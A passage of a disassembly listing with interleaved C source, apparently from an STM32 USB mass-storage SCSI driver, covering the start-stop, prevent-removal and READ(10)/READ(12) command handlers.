 800a348:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a34c:	68fb      	ldr	r3, [r7, #12]
 800a34e:	32b0      	adds	r2, #176	; 0xb0
 800a350:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a354:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a356:	697b      	ldr	r3, [r7, #20]
 800a358:	2b00      	cmp	r3, #0
 800a35a:	d102      	bne.n	800a362 <SCSI_StartStopUnit+0x2a>
  {
    return -1;
 800a35c:	f04f 33ff 	mov.w	r3, #4294967295
 800a360:	e043      	b.n	800a3ea <SCSI_StartStopUnit+0xb2>
  }

  if ((hmsc->scsi_medium_state == SCSI_MEDIUM_LOCKED) && ((params[4] & 0x3U) == 2U))
 800a362:	697b      	ldr	r3, [r7, #20]
 800a364:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a368:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a36c:	2b01      	cmp	r3, #1
 800a36e:	d10f      	bne.n	800a390 <SCSI_StartStopUnit+0x58>
 800a370:	687b      	ldr	r3, [r7, #4]
 800a372:	3304      	adds	r3, #4
 800a374:	781b      	ldrb	r3, [r3, #0]
 800a376:	f003 0303 	and.w	r3, r3, #3
 800a37a:	2b02      	cmp	r3, #2
 800a37c:	d108      	bne.n	800a390 <SCSI_StartStopUnit+0x58>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800a37e:	7af9      	ldrb	r1, [r7, #11]
 800a380:	2324      	movs	r3, #36	; 0x24
 800a382:	2205      	movs	r2, #5
 800a384:	68f8      	ldr	r0, [r7, #12]
 800a386:	f7ff ff7b 	bl	800a280 <SCSI_SenseCode>

    return -1;
 800a38a:	f04f 33ff 	mov.w	r3, #4294967295
 800a38e:	e02c      	b.n	800a3ea <SCSI_StartStopUnit+0xb2>
  }

  if ((params[4] & 0x3U) == 0x1U) /* START=1 */
 800a390:	687b      	ldr	r3, [r7, #4]
 800a392:	3304      	adds	r3, #4
 800a394:	781b      	ldrb	r3, [r3, #0]
 800a396:	f003 0303 	and.w	r3, r3, #3
 800a39a:	2b01      	cmp	r3, #1
 800a39c:	d106      	bne.n	800a3ac <SCSI_StartStopUnit+0x74>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a39e:	697b      	ldr	r3, [r7, #20]
 800a3a0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3a4:	2200      	movs	r2, #0
 800a3a6:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a3aa:	e01a      	b.n	800a3e2 <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x2U) /* START=0 and LOEJ Load Eject=1 */
 800a3ac:	687b      	ldr	r3, [r7, #4]
 800a3ae:	3304      	adds	r3, #4
 800a3b0:	781b      	ldrb	r3, [r3, #0]
 800a3b2:	f003 0303 	and.w	r3, r3, #3
 800a3b6:	2b02      	cmp	r3, #2
 800a3b8:	d106      	bne.n	800a3c8 <SCSI_StartStopUnit+0x90>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_EJECTED;
 800a3ba:	697b      	ldr	r3, [r7, #20]
 800a3bc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3c0:	2202      	movs	r2, #2
 800a3c2:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a3c6:	e00c      	b.n	800a3e2 <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x3U) /* START=1 and LOEJ Load Eject=1 */
 800a3c8:	687b      	ldr	r3, [r7, #4]
 800a3ca:	3304      	adds	r3, #4
 800a3cc:	781b      	ldrb	r3, [r3, #0]
 800a3ce:	f003 0303 	and.w	r3, r3, #3
 800a3d2:	2b03      	cmp	r3, #3
 800a3d4:	d105      	bne.n	800a3e2 <SCSI_StartStopUnit+0xaa>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a3d6:	697b      	ldr	r3, [r7, #20]
 800a3d8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3dc:	2200      	movs	r2, #0
 800a3de:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }
  else
  {
    /* .. */
  }
  hmsc->bot_data_length = 0U;
 800a3e2:	697b      	ldr	r3, [r7, #20]
 800a3e4:	2200      	movs	r2, #0
 800a3e6:	60da      	str	r2, [r3, #12]

  return 0;
 800a3e8:	2300      	movs	r3, #0
}
 800a3ea:	4618      	mov	r0, r3
 800a3ec:	3718      	adds	r7, #24
 800a3ee:	46bd      	mov	sp, r7
 800a3f0:	bd80      	pop	{r7, pc}

0800a3f2 <SCSI_AllowPreventRemovable>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_AllowPreventRemovable(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a3f2:	b480      	push	{r7}
 800a3f4:	b087      	sub	sp, #28
 800a3f6:	af00      	add	r7, sp, #0
 800a3f8:	60f8      	str	r0, [r7, #12]
 800a3fa:	460b      	mov	r3, r1
 800a3fc:	607a      	str	r2, [r7, #4]
 800a3fe:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a400:	68fb      	ldr	r3, [r7, #12]
 800a402:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a406:	68fb      	ldr	r3, [r7, #12]
 800a408:	32b0      	adds	r2, #176	; 0xb0
 800a40a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a40e:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a410:	697b      	ldr	r3, [r7, #20]
 800a412:	2b00      	cmp	r3, #0
 800a414:	d102      	bne.n	800a41c <SCSI_AllowPreventRemovable+0x2a>
  {
    return -1;
 800a416:	f04f 33ff 	mov.w	r3, #4294967295
 800a41a:	e015      	b.n	800a448 <SCSI_AllowPreventRemovable+0x56>
  }

  if (params[4] == 0U)
 800a41c:	687b      	ldr	r3, [r7, #4]
 800a41e:	3304      	adds	r3, #4
 800a420:	781b      	ldrb	r3, [r3, #0]
 800a422:	2b00      	cmp	r3, #0
 800a424:	d106      	bne.n	800a434 <SCSI_AllowPreventRemovable+0x42>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a426:	697b      	ldr	r3, [r7, #20]
 800a428:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a42c:	2200      	movs	r2, #0
 800a42e:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a432:	e005      	b.n	800a440 <SCSI_AllowPreventRemovable+0x4e>
  }
  else
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_LOCKED;
 800a434:	697b      	ldr	r3, [r7, #20]
 800a436:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a43a:	2201      	movs	r2, #1
 800a43c:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }

  hmsc->bot_data_length = 0U;
 800a440:	697b      	ldr	r3, [r7, #20]
 800a442:	2200      	movs	r2, #0
 800a444:	60da      	str	r2, [r3, #12]

  return 0;
 800a446:	2300      	movs	r3, #0
}
 800a448:	4618      	mov	r0, r3
 800a44a:	371c      	adds	r7, #28
 800a44c:	46bd      	mov	sp, r7
 800a44e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a452:	4770      	bx	lr

0800a454 <SCSI_Read10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a454:	b580      	push	{r7, lr}
 800a456:	b086      	sub	sp, #24
 800a458:	af00      	add	r7, sp, #0
 800a45a:	60f8      	str	r0, [r7, #12]
 800a45c:	460b      	mov	r3, r1
 800a45e:	607a      	str	r2, [r7, #4]
 800a460:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a462:	68fb      	ldr	r3, [r7, #12]
 800a464:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a468:	68fb      	ldr	r3, [r7, #12]
 800a46a:	32b0      	adds	r2, #176	; 0xb0
 800a46c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a470:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a472:	697b      	ldr	r3, [r7, #20]
 800a474:	2b00      	cmp	r3, #0
 800a476:	d102      	bne.n	800a47e <SCSI_Read10+0x2a>
  {
    return -1;
 800a478:	f04f 33ff 	mov.w	r3, #4294967295
 800a47c:	e09d      	b.n	800a5ba <SCSI_Read10+0x166>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a47e:	697b      	ldr	r3, [r7, #20]
 800a480:	7a1b      	ldrb	r3, [r3, #8]
 800a482:	2b00      	cmp	r3, #0
 800a484:	f040 808f 	bne.w	800a5a6 <SCSI_Read10+0x152>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a488:	697b      	ldr	r3, [r7, #20]
 800a48a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a48e:	7f1b      	ldrb	r3, [r3, #28]
 800a490:	b25b      	sxtb	r3, r3
 800a492:	2b00      	cmp	r3, #0
 800a494:	db0b      	blt.n	800a4ae <SCSI_Read10+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a496:	697b      	ldr	r3, [r7, #20]
 800a498:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a49c:	7f59      	ldrb	r1, [r3, #29]
 800a49e:	2320      	movs	r3, #32
 800a4a0:	2205      	movs	r2, #5
 800a4a2:	68f8      	ldr	r0, [r7, #12]
 800a4a4:	f7ff feec 	bl	800a280 <SCSI_SenseCode>
      return -1;
 800a4a8:	f04f 33ff 	mov.w	r3, #4294967295
 800a4ac:	e085      	b.n	800a5ba <SCSI_Read10+0x166>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a4ae:	697b      	ldr	r3, [r7, #20]
 800a4b0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4b4:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a4b8:	2b02      	cmp	r3, #2
 800a4ba:	d108      	bne.n	800a4ce <SCSI_Read10+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a4bc:	7af9      	ldrb	r1, [r7, #11]
 800a4be:	233a      	movs	r3, #58	; 0x3a
 800a4c0:	2202      	movs	r2, #2
 800a4c2:	68f8      	ldr	r0, [r7, #12]
 800a4c4:	f7ff fedc 	bl	800a280 <SCSI_SenseCode>

      return -1;
 800a4c8:	f04f 33ff 	mov.w	r3, #4294967295
 800a4cc:	e075      	b.n	800a5ba <SCSI_Read10+0x166>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a4ce:	68fb      	ldr	r3, [r7, #12]
 800a4d0:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a4d4:	68fa      	ldr	r2, [r7, #12]
 800a4d6:	33b0      	adds	r3, #176	; 0xb0
 800a4d8:	009b      	lsls	r3, r3, #2
 800a4da:	4413      	add	r3, r2
 800a4dc:	685b      	ldr	r3, [r3, #4]
 800a4de:	689b      	ldr	r3, [r3, #8]
 800a4e0:	7afa      	ldrb	r2, [r7, #11]
 800a4e2:	4610      	mov	r0, r2
 800a4e4:	4798      	blx	r3
 800a4e6:	4603      	mov	r3, r0
 800a4e8:	2b00      	cmp	r3, #0
 800a4ea:	d008      	beq.n	800a4fe <SCSI_Read10+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a4ec:	7af9      	ldrb	r1, [r7, #11]
 800a4ee:	233a      	movs	r3, #58	; 0x3a
 800a4f0:	2202      	movs	r2, #2
 800a4f2:	68f8      	ldr	r0, [r7, #12]
 800a4f4:	f7ff fec4 	bl	800a280 <SCSI_SenseCode>
      return -1;
 800a4f8:	f04f 33ff 	mov.w	r3, #4294967295
 800a4fc:	e05d      	b.n	800a5ba <SCSI_Read10+0x166>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a4fe:	687b      	ldr	r3, [r7, #4]
 800a500:	3302      	adds	r3, #2
 800a502:	781b      	ldrb	r3, [r3, #0]
 800a504:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a506:	687b      	ldr	r3, [r7, #4]
 800a508:	3303      	adds	r3, #3
 800a50a:	781b      	ldrb	r3, [r3, #0]
 800a50c:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a50e:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a510:	687b      	ldr	r3, [r7, #4]
 800a512:	3304      	adds	r3, #4
 800a514:	781b      	ldrb	r3, [r3, #0]
 800a516:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a518:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a51a:	687a      	ldr	r2, [r7, #4]
 800a51c:	3205      	adds	r2, #5
 800a51e:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a520:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a522:	697a      	ldr	r2, [r7, #20]
 800a524:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a528:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] <<  8) | (uint32_t)params[8];
 800a52a:	687b      	ldr	r3, [r7, #4]
 800a52c:	3307      	adds	r3, #7
 800a52e:	781b      	ldrb	r3, [r3, #0]
 800a530:	021b      	lsls	r3, r3, #8
 800a532:	687a      	ldr	r2, [r7, #4]
 800a534:	3208      	adds	r2, #8
 800a536:	7812      	ldrb	r2, [r2, #0]
 800a538:	4313      	orrs	r3, r2
 800a53a:	697a      	ldr	r2, [r7, #20]
 800a53c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a540:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a542:	697b      	ldr	r3, [r7, #20]
 800a544:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a548:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a54a:	697b      	ldr	r3, [r7, #20]
 800a54c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a550:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a552:	7af9      	ldrb	r1, [r7, #11]
 800a554:	68f8      	ldr	r0, [r7, #12]
 800a556:	f000 fb0c 	bl	800ab72 <SCSI_CheckAddressRange>
 800a55a:	4603      	mov	r3, r0
 800a55c:	2b00      	cmp	r3, #0
 800a55e:	da02      	bge.n	800a566 <SCSI_Read10+0x112>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a560:	f04f 33ff 	mov.w	r3, #4294967295
 800a564:	e029      	b.n	800a5ba <SCSI_Read10+0x166>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a566:	697b      	ldr	r3, [r7, #20]
 800a568:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a56c:	699a      	ldr	r2, [r3, #24]
 800a56e:	697b      	ldr	r3, [r7, #20]
 800a570:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a574:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a576:	6979      	ldr	r1, [r7, #20]
 800a578:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a57c:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a580:	fb01 f303 	mul.w	r3, r1, r3
 800a584:	429a      	cmp	r2, r3
 800a586:	d00b      	beq.n	800a5a0 <SCSI_Read10+0x14c>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a588:	697b      	ldr	r3, [r7, #20]
 800a58a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a58e:	7f59      	ldrb	r1, [r3, #29]
 800a590:	2320      	movs	r3, #32
 800a592:	2205      	movs	r2, #5
 800a594:	68f8      	ldr	r0, [r7, #12]
 800a596:	f7ff fe73 	bl	800a280 <SCSI_SenseCode>
      return -1;
 800a59a:	f04f 33ff 	mov.w	r3, #4294967295
 800a59e:	e00c      	b.n	800a5ba <SCSI_Read10+0x166>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a5a0:	697b      	ldr	r3, [r7, #20]
 800a5a2:	2202      	movs	r2, #2
 800a5a4:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a5a6:	697b      	ldr	r3, [r7, #20]
 800a5a8:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a5ac:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a5ae:	7afb      	ldrb	r3, [r7, #11]
 800a5b0:	4619      	mov	r1, r3
 800a5b2:	68f8      	ldr	r0, [r7, #12]
 800a5b4:	f000 fb0a 	bl	800abcc <SCSI_ProcessRead>
 800a5b8:	4603      	mov	r3, r0
}
 800a5ba:	4618      	mov	r0, r3
 800a5bc:	3718      	adds	r7, #24
 800a5be:	46bd      	mov	sp, r7
 800a5c0:	bd80      	pop	{r7, pc}

0800a5c2 <SCSI_Read12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a5c2:	b580      	push	{r7, lr}
 800a5c4:	b086      	sub	sp, #24
 800a5c6:	af00      	add	r7, sp, #0
 800a5c8:	60f8      	str	r0, [r7, #12]
 800a5ca:	460b      	mov	r3, r1
 800a5cc:	607a      	str	r2, [r7, #4]
 800a5ce:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a5d0:	68fb      	ldr	r3, [r7, #12]
 800a5d2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a5d6:	68fb      	ldr	r3, [r7, #12]
 800a5d8:	32b0      	adds	r2, #176	; 0xb0
 800a5da:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a5de:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a5e0:	697b      	ldr	r3, [r7, #20]
 800a5e2:	2b00      	cmp	r3, #0
 800a5e4:	d102      	bne.n	800a5ec <SCSI_Read12+0x2a>
  {
    return -1;
 800a5e6:	f04f 33ff 	mov.w	r3, #4294967295
 800a5ea:	e0a7      	b.n	800a73c <SCSI_Read12+0x17a>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a5ec:	697b      	ldr	r3, [r7, #20]
 800a5ee:	7a1b      	ldrb	r3, [r3, #8]
 800a5f0:	2b00      	cmp	r3, #0
 800a5f2:	f040 8099 	bne.w	800a728 <SCSI_Read12+0x166>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a5f6:	697b      	ldr	r3, [r7, #20]
 800a5f8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5fc:	7f1b      	ldrb	r3, [r3, #28]
 800a5fe:	b25b      	sxtb	r3, r3
 800a600:	2b00      	cmp	r3, #0
 800a602:	db0b      	blt.n	800a61c <SCSI_Read12+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a604:	697b      	ldr	r3, [r7, #20]
 800a606:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a60a:	7f59      	ldrb	r1, [r3, #29]
 800a60c:	2320      	movs	r3, #32
 800a60e:	2205      	movs	r2, #5
 800a610:	68f8      	ldr	r0, [r7, #12]
 800a612:	f7ff fe35 	bl	800a280 <SCSI_SenseCode>
      return -1;
 800a616:	f04f 33ff 	mov.w	r3, #4294967295
 800a61a:	e08f      	b.n	800a73c <SCSI_Read12+0x17a>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a61c:	697b      	ldr	r3, [r7, #20]
 800a61e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a622:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a626:	2b02      	cmp	r3, #2
 800a628:	d108      	bne.n	800a63c <SCSI_Read12+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a62a:	7af9      	ldrb	r1, [r7, #11]
 800a62c:	233a      	movs	r3, #58	; 0x3a
 800a62e:	2202      	movs	r2, #2
 800a630:	68f8      	ldr	r0, [r7, #12]
 800a632:	f7ff fe25 	bl	800a280 <SCSI_SenseCode>
      return -1;
 800a636:	f04f 33ff 	mov.w	r3, #4294967295
 800a63a:	e07f      	b.n	800a73c <SCSI_Read12+0x17a>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a63c:	68fb      	ldr	r3, [r7, #12]
 800a63e:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a642:	68fa      	ldr	r2, [r7, #12]
 800a644:	33b0      	adds	r3, #176	; 0xb0
 800a646:	009b      	lsls	r3, r3, #2
 800a648:	4413      	add	r3, r2
 800a64a:	685b      	ldr	r3, [r3, #4]
 800a64c:	689b      	ldr	r3, [r3, #8]
 800a64e:	7afa      	ldrb	r2, [r7, #11]
 800a650:	4610      	mov	r0, r2
 800a652:	4798      	blx	r3
 800a654:	4603      	mov	r3, r0
 800a656:	2b00      	cmp	r3, #0
 800a658:	d008      	beq.n	800a66c <SCSI_Read12+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a65a:	7af9      	ldrb	r1, [r7, #11]
 800a65c:	233a      	movs	r3, #58	; 0x3a
 800a65e:	2202      	movs	r2, #2
 800a660:	68f8      	ldr	r0, [r7, #12]
 800a662:	f7ff fe0d 	bl	800a280 <SCSI_SenseCode>
      return -1;
 800a666:	f04f 33ff 	mov.w	r3, #4294967295
 800a66a:	e067      	b.n	800a73c <SCSI_Read12+0x17a>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a66c:	687b      	ldr	r3, [r7, #4]
 800a66e:	3302      	adds	r3, #2
 800a670:	781b      	ldrb	r3, [r3, #0]
 800a672:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a674:	687b      	ldr	r3, [r7, #4]
 800a676:	3303      	adds	r3, #3
 800a678:	781b      	ldrb	r3, [r3, #0]
 800a67a:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a67c:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a67e:	687b      	ldr	r3, [r7, #4]
 800a680:	3304      	adds	r3, #4
 800a682:	781b      	ldrb	r3, [r3, #0]
 800a684:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a686:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a688:	687a      	ldr	r2, [r7, #4]
 800a68a:	3205      	adds	r2, #5
 800a68c:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a68e:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a690:	697a      	ldr	r2, [r7, #20]
 800a692:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a696:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a698:	687b      	ldr	r3, [r7, #4]
 800a69a:	3306      	adds	r3, #6
 800a69c:	781b      	ldrb	r3, [r3, #0]
 800a69e:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800a6a0:	687b      	ldr	r3, [r7, #4]
 800a6a2:	3307      	adds	r3, #7
 800a6a4:	781b      	ldrb	r3, [r3, #0]
 800a6a6:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a6a8:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800a6aa:	687b      	ldr	r3, [r7, #4]
 800a6ac:	3308      	adds	r3, #8
 800a6ae:	781b      	ldrb	r3, [r3, #0]
 800a6b0:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800a6b2:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800a6b4:	687a      	ldr	r2, [r7, #4]
 800a6b6:	3209      	adds	r2, #9
 800a6b8:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800a6ba:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a6bc:	697a      	ldr	r2, [r7, #20]
 800a6be:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a6c2:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a6c4:	697b      	ldr	r3, [r7, #20]
 800a6c6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6ca:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a6cc:	697b      	ldr	r3, [r7, #20]
 800a6ce:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6d2:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a6d4:	7af9      	ldrb	r1, [r7, #11]
 800a6d6:	68f8      	ldr	r0, [r7, #12]
 800a6d8:	f000 fa4b 	bl	800ab72 <SCSI_CheckAddressRange>
 800a6dc:	4603      	mov	r3, r0
 800a6de:	2b00      	cmp	r3, #0
 800a6e0:	da02      	bge.n	800a6e8 <SCSI_Read12+0x126>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a6e2:	f04f 33ff 	mov.w	r3, #4294967295
 800a6e6:	e029      	b.n	800a73c <SCSI_Read12+0x17a>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a6e8:	697b      	ldr	r3, [r7, #20]
 800a6ea:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6ee:	699a      	ldr	r2, [r3, #24]
 800a6f0:	697b      	ldr	r3, [r7, #20]
 800a6f2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6f6:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a6f8:	6979      	ldr	r1, [r7, #20]
 800a6fa:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a6fe:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a702:	fb01 f303 	mul.w	r3, r1, r3
 800a706:	429a      	cmp	r2, r3
 800a708:	d00b      	beq.n	800a722 <SCSI_Read12+0x160>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a70a:	697b      	ldr	r3, [r7, #20]
 800a70c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a710:	7f59      	ldrb	r1, [r3, #29]
 800a712:	2320      	movs	r3, #32
 800a714:	2205      	movs	r2, #5
 800a716:	68f8      	ldr	r0, [r7, #12]
 800a718:	f7ff fdb2 	bl	800a280 <SCSI_SenseCode>
      return -1;
 800a71c:	f04f 33ff 	mov.w	r3, #4294967295
 800a720:	e00c      	b.n	800a73c <SCSI_Read12+0x17a>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a722:	697b      	ldr	r3, [r7, #20]
 800a724:	2202      	movs	r2, #2
 800a726:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a728:	697b      	ldr	r3, [r7, #20]
 800a72a:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a72e:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a730:	7afb      	ldrb	r3, [r7, #11]
 800a732:	4619      	mov	r1, r3
 800a734:	68f8      	ldr	r0, [r7, #12]
 800a736:	f000 fa49 	bl	800abcc <SCSI_ProcessRead>
 800a73a:	4603      	mov	r3, r0
}
 800a73c:	4618      	mov	r0, r3
 800a73e:	3718      	adds	r7, #24
 800a740:	46bd      	mov	sp, r7
 800a742:	bd80      	pop	{r7, pc}

0800a744 <SCSI_Write10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a744:	b580      	push	{r7, lr}
 800a746:	b086      	sub	sp, #24
 800a748:	af00      	add	r7, sp, #0
 800a74a:	60f8      	str	r0, [r7, #12]
 800a74c:	460b      	mov	r3, r1
